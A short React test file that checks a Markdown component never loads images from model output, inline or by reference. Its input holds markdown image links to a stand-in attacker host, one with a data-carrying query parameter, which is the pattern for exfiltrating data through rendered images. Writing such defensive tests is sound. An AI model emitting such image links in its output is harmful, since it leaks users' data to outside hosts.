import { describe, expect, it } from 'vitest';
import { render } from '@testing-library/react';
import { Markdown } from '@/components/ui/markdown';

describe('Markdown', () => {
  it('never loads an image from model output, inline or by reference', () => {
    const { container } = render(
      <Markdown>{'![pixel](https://attacker.example/p.png?d=CASE)\n\n![ref][r]\n\n[r]: https://attacker.example/q'}</Markdown>,
    );

    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('a[href="https://attacker.example/p.png?d=CASE"]')).toHaveTextContent('pixel');
  });
});
